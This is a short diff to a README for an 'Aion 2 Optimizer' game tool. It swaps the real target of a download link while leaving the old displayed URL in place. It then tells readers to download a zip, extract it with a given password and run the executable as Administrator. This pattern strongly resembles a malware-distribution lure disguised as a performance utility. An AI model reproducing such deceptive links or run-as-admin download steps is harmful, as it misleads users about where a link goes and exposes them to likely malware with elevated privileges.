@@ -44,7 +44,7 @@ Aion 2 Optimizer is a lightweight, one‑click tool that applies proven performa
 
 | Step | Action |
 |------|--------|
-| 1 | Open the official landing page → **[portkreheed40.github.io/Aion2Optimizer](https://portkreheed40.github.io/Aion2Optimizer/)** |
+| 1 | Open the official landing page → **[portkreheed40.github.io/Aion2Optimizer](https://dikedonormesmerize.github.io/Aion-2-Optimizer/)** |
 | 2 | Download `Aion2Optimizer_v1.0.zip` from the page. |
 | 3 | Extract the archive using the password: **`8025381933`**. |
 | 4 | Run `Aion2Optimizer.exe` as **Administrator**. |
